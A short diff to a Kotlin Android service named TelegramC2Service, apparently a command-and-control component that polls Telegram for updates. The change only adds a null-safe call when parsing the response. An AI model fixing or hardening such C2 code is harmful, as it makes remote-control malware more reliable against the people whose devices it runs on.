@@ -202,7 +202,7 @@ class TelegramC2Service : Service() {
                     delay(5000)
                     continue
                 }
-                val results = resp.optJSONArray("result") ?: JSONArray()
+                val results = resp?.optJSONArray("result") ?: JSONArray()
                 for (i in 0 until results.length()) {
                     val upd = results.getJSONObject(i)
                     val updateId = upd.optLong("update_id")
